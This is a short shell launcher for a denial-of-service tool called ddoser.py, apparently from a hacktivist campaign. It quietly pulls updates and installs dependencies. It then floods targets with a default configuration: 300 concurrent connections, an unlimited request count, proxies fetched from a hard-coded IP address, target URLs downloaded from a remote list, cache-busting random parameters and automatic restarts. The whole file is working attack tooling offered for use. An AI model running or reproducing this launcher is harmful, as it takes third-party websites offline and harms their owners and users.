#!/bin/sh

git pull > /dev/null 2>&1
pip3 install -r requirements.txt > /dev/null 2>&1

if [ "$1" != "" ]; then
  python3 ddoser.py "$@"
else
  echo "Default params used"
  python3 ddoser.py --proxy-url 'http://143.244.166.15/proxy.list' --target-urls-file 'https://raw.githubusercontent.com/imsamurai/ban/master/urls.txt' --concurrency 300 --count 0 --timeout 10 --user-agent 'Stop war against Ukraine!' --with-random-get-param --restart-period 600
fi
